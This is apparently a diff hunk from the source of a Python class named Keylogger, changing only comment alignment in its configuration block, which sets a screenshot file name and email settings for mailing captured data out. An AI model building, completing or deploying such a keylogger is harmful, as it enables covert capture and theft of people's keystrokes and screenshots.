@@ -30,8 +30,8 @@ class Keylogger():
         self.ScreenFile = "screenlog"                # Screenshot filename
 
         #Email settings
-        self.Email = "example@gmail.com"      # Your Email (Sender)
-        self.Password = "pass"              # Your Password (Sender)
+        self.Email = "example@gmail.com"             # Your Email (Sender)
+        self.Password = "pass"                       # Your Password (Sender)
         self.ToEmail = self.Email                    # Email (Recipient)
         self.Subject = "subject example"             # Email Subject
         self.Body = "body example"                   # Email Body
